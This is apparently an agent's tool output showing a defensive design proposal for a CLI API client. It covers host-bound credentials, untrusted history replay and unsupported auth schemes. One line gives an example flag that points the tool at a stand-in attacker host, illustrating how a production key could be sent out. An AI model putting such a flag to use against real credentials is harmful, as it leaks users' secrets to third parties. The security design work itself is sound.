      {
        "tool_use_id": "toolu_01QDjvM9KBv1zXiv1zXmSuXE",
        "type": "tool_result",
        "content": "1\t# Proposed DESIGN.md amendments — three decisions the review loop cannot make\n2\t\n3\t*Drafted 2026-08-03 · not yet folded into DESIGN.md · awaiting review*\n4\t\n5\tCycle 2 of the review re-run produced 8 CRIT findings. Five are implementation misses against\n6\tthe design as written. Three need a decision the design does not currently make, and patching\n7\tthem without one is why the loop kept rediscovering the same defect in new places.\n8\t\n9\tEach amendment below states **the gap**, **the options**, **the recommendation**, and **the\n10\texact text** to insert. Approve, change, or reject each independently.\n11\t\n12\t---\n13\t\n14\t## Amendment 1 — Credentials bind to hosts\n15\t\n16\t**The gap.** §5a exhaustively covers *does a secret appear in output*. It never asks *which\n17\thost may receive it*. So `--base-url https://attacker.example` happily sends your production\n18\tkey to an attacker, and no rule was violated because no rule exists.\n19\t\n20\tThis is the root of review findings 1 and 2. Fixing them individually invents policy; the next\n21\treviewer finds a third instance.\n22\t\n23\t**Options considered**\n24\t\n25\t| Option | Behaviour | Why not |\n26\t|---|---|---|\n27\t| Bind to the spec's `servers[]` | Credentials go only to declared hosts; anything else needs an explicit flag | **Recommended** |\n28\t| Bind to the profile | A profile names its host; off-profile hosts need a profile | Punishes the no-profile path, which is the common agent case |\n29\t| Config allowlist per credential | Explicit host list per scheme | Most precise, most setup. Nothing to point at on first run |\n30\t\n31\t**Recommendation: bind to `servers[]`, default-deny, explicit override.** It matches the\n32\tpattern §3.5 already establishes with `--allow-mutations` — the dangerous thing requires a\n33\tflag a human typed on purpose. It also makes finding 2 disappear rather than needing its own\n34\tfix, and it keeps the twin loop working with no ceremony, because the twin needs no real\n35\tcredentials by design (§6).\n36\t\n37\t### Proposed text — new subsection in §5a, after \"How secrets reach curl\"\n38\t\n39\t> ### Credentials bind to hosts\n40\t>\n41\t> **Invariant: a resolved credential is transmitted only to a host the spec declares, or one\n42\t> a human has explicitly allowed.**\n43\t>\n44\t> The allowed host set for a call is:\n45\t>\n46\t> 1. every host in the spec's `servers[]`, after server-variable substitution; plus\n47\t> 2. every host passed as `--allow-host HOST` (repeatable); plus\n48\t> 3. every host in `allow_hosts:` in the active profile.\n49\t>\n50\t> When `--base-url` points outside that set, the request still runs — but **every credential is\n51\t> withheld**, and the omission is reported both ways:\n52\t>\n53\t> - a one-line warning on stderr naming the withheld schemes and the offending host;\n54\t> - a machine-readable field in the output envelope, so an agent can act on it rather than\n55\t>   inferring it from a downstream 401:\n56\t>\n57\t> ```json\n58\t> \"credentials_withheld\": [\n59\t>   {\"scheme\": \"bearerAuth\", \"reason\": \"host not in spec servers[]\", \"host\": \"localhost:9000\"}\n60\t> ]\n61\t> ```\n62\t>\n63\t> Withholding rather than refusing is deliberate: pointing at a local twin is the single most\n64\t> common `--base-url` use, and the twin accepts placeholder credentials by design (§6). An\n65\t> agent working against the twin must not need a flag, and must not be handed a real secret.\n66\t>\n67\t> `auth check` reports against the *resolved* host set, so \"present\" never means \"will\n68\t> actually be sent\".\n69\t\n70\t---\n71\t\n72\t## Amendment 2 — History is untrusted input on read\n73\t\n74\t**The gap.** §5a governs history at **write** time (redact before it touches disk) and says\n75\tnothing about **read** time. But a history file is a persistent artifact that may have been\n76\twritten by a different project, copied between machines, or edited by hand. `history replay`\n77\tcurrently trusts it: review finding 2 showed a stored entry naming an arbitrary env var and an\n78\tarbitrary host, turning the credential firewall into a delivery mechanism.\n79\t\n80\t**No real alternatives here** — the only question is how strict. Recommendation: replay\n81\tre-derives everything and trusts the entry for nothing that has security consequence.\n82\t\n83\t### Proposed text — new subsection in §5a, after the leak-channel table\n84\t\n85\t> ### History is untrusted input when read\n86\t>\n87\t> Redaction at write time (above) protects what *leaves* the tool. It says nothing about what\n88\t> comes back *in*. A history file is a persistent artifact: it may have been written by another\n89\t> project, copied from another machine, or edited by hand. **Every field in a history entry is\n90\t> untrusted input.**\n91\t>\n92\t> `history replay` therefore re-derives rather than replays:\n93\t>\n94\t> | Field | Treatment on replay |\n95\t> |---|---|\n96\t> | operationId, params, body | Re-bound through the normal request-construction path, re-validated against the current spec |\n97\t> | Credentials | **Never taken from the entry.** Re-resolved from the current environment and profile, subject to the host-binding rule above |\n98\t> | Target host | Taken from the current `--base-url`, profile, or spec — never from the stored URL. If the stored entry's host is outside the currently allowed set, replay refuses with exit 2 rather than silently retargeting |\n99\t> | Env var names | Only names inside the `TALARIA_AUTH_*` namespace are resolvable. A stored entry naming any other variable is a malformed entry, not a lookup |\n100\t> | Sizes and types | Bounded and type-checked before use. A corrupt or hostile entry fails that entry, never the process |\n101\t>\n102\t> The rule in one line: **a history entry is data, never instruction.**\n103\t\n104\t---\n105\t\n106\t## Amendment 3 — Schemes v1 does not support\n107\t\n108\t**The gap.** §5 says OAuth flows are out of scope, \"bring your own token\". It never says what\n109\thappens when a spec *declares* `oauth2`. Today `auth check` exits 0 reporting nothing is\n110\tneeded, and then `call` refuses — the one command an agent uses to self-diagnose auth gives an\n111\tanswer that is simply false.\n112\t\n113\t**Recommendation:** honour the \"bring your own token\" intent explicitly rather than by accident.\n114\t\n115\t### Proposed text — replace the last bullet of §5 \"Auth\"\n116\t\n117\t> - v1 resolves `http bearer`, `http basic`, and `apiKey` (header, query, cookie) schemes.\n118\t> - A scheme outside that set — `oauth2`, `openIdConnect`, `mutualTLS` — is **unsupported, not\n119\t>   invisible**. When an operation requires one:\n120\t>   - if `TALARIA_AUTH_BEARER` is set, the scheme is satisfied by that token. This *is* \"bring\n121\t>     your own token\": the user obtained it however the flow demands, and talaria simply\n122\t>     carries it;\n123\t>   - if it is not set, the operation is unsatisfiable. `auth check` reports\n124\t>     `{\"scheme\":\"oauth2\",\"supported\":false,\"present\":false}` and exits 5; `call` and `run`\n125\t>     exit 5 with a structured error naming the scheme and the variable to set.\n126\t> - `auth check` never reports a scheme as satisfied when the call would refuse it. The two\n127\t>   commands agree by construction, or `auth check` is worthless to an agent.\n128\t\n129\t---\n130\t\n131\t## What this unblocks\n132\t\n133\tWith these three in place, all 8 of cycle 2's CRIT findings become implementation work with a\n134\tspecification to converge on:\n135\t\n136\t| Finding | Status after amendment |\n137\t|---|---|\n138\t| 1. Credential sent to any host `--base-url` names | Amendment 1 |\n139\t| 2. `history replay` ships a credential to any host | Amendments 1 + 2 |\n140\t| 4. OAuth2 spec silently uncallable, `auth check` exits 0 | Amendment 3 |\n141\t| 3. `run` ignores parameter-level `examples` | Already specified — implementation miss |\n142\t| 5. Server variables never substituted | Already specified — and Amendment 1 now depends on it |\n143\t| 6. `--output tsv` structurally unsound | Already specified — implementation miss |\n144\t| 7. Hostile `minLength` causes a Go OOM | Already specified (structured errors) — implementation miss |\n145\t| 8. History append rewrites the whole store | Already specified (append-only JSONL) — implementation miss |\n146\t\n147\tNote that **Amendment 1 depends on finding 5**: host binding reads `servers[]`, and server\n148\tvariables must be substituted before that list means anything. Fix 5 first.\n149\t"
      }
    ]
